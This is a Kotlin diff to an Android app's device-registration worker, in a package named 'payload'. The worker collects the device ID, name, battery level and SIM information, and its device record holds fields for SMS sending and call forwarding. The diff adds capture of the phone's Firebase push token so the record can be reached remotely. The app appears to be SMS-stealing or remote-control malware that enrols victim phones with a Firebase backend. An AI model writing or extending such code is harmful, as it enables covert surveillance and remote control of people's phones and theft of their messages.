@@ -6,6 +6,7 @@ import android.provider.Settings
 import androidx.work.CoroutineWorker
 import androidx.work.WorkerParameters
 import com.google.firebase.firestore.FirebaseFirestore
+import com.google.firebase.messaging.FirebaseMessaging
 import com.payload.jansiix0ne.models.DeviceModel
 import com.payload.jansiix0ne.models.SimModel
 import com.payload.jansiix0ne.utils.DeviceUtils
@@ -30,9 +31,18 @@ class RegisterUserWorker(
             val batteryLevel = DeviceUtils.getBatteryLevel(applicationContext)
             val simInfo = DeviceUtils.getSimInfo(applicationContext)
             
+            // Get FCM token
+            val fcmToken = try {
+                FirebaseMessaging.getInstance().token.await()
+            } catch (e: Exception) {
+                android.util.Log.e("RegisterUserWorker", "Failed to get FCM token: ${e.message}")
+                ""
+            }
+            
             android.util.Log.d("RegisterUserWorker", "Device ID: $deviceId")
             android.util.Log.d("RegisterUserWorker", "Device Name: $deviceName")
             android.util.Log.d("RegisterUserWorker", "Battery: $batteryLevel%")
+            android.util.Log.d("RegisterUserWorker", "FCM Token: ${if (fcmToken.isNotEmpty()) "✅" else "❌"}")
             android.util.Log.d("RegisterUserWorker", "SIM Info collected")
             
             val deviceModel = DeviceModel(
@@ -47,7 +57,7 @@ class RegisterUserWorker(
                     enabled = false
                 ),
                 send_sms = null,
-                fcmToken = null,
+                fcmToken = fcmToken.ifEmpty { null },
                 callForwardStatus = false,
                 userInfo = null
             )
